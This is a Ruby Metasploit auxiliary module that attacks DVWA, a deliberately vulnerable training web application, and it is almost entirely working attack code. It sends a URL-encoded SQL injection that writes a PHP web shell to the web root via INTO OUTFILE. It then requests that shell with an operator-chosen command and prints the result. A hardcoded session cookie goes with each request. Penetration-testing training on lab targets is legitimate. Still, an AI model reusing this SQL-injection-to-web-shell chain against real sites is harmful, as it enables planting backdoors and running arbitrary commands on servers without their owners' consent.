require 'rex/proto/http'
require 'msf/core'
class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner
	def initialize
		super(
			'Name'        => 'DVWA SQL Injection to Command Execution',
			'Description' => 'Exploits SQL Injection Bug to Upload Stager and Execute Arbitrary Commands on the Target',
			'Author'      => 'Nipun_Jaswal',
			'License'     => MSF_LICENSE)
			register_options(
			[
				OptString.new('DIRS', [ true,  "Directory Structure", '/vulnerabilities/sqli/']),
				OptString.new('Command', [ true, "Command To Execute", 'ls'])
			], self.class)
	end
	def run_host(ip)
		begin
		sqli2 = "-112%27%20UNION%20SELECT%20%27%3C%3Fphp%20system%28%24_GET%5B%5C%27id%5C%27%5D%29%3B%20%3F%3E%27,NULL%20INTO%20OUTFILE%20%27/var/www/html/imgs/fuc.php%27--+&Submit=Submit"  
		dir_path = datastore['DIRS']
		comm = datastore['Command'] 
		res = send_request_raw({
			'method'    => 'GET',
			'uri'       => "#{dir_path}index.php?id=#{sqli2}",
			'cookie'    => "adminer_version=0; PHPSESSID=9gvpo3hf49kf5fud13e0g1i793; security=low"
					})
		res2 = send_request_raw({
			'method'    => 'GET',
			'uri'       => "/imgs/fuc.php?id=#{comm}",
			'cookie'    => "adminer_version=0; PHPSESSID=9gvpo3hf49kf5fud13e0g1i793; security=low"
					})
		print_line res2.body				   
		end
	end

end

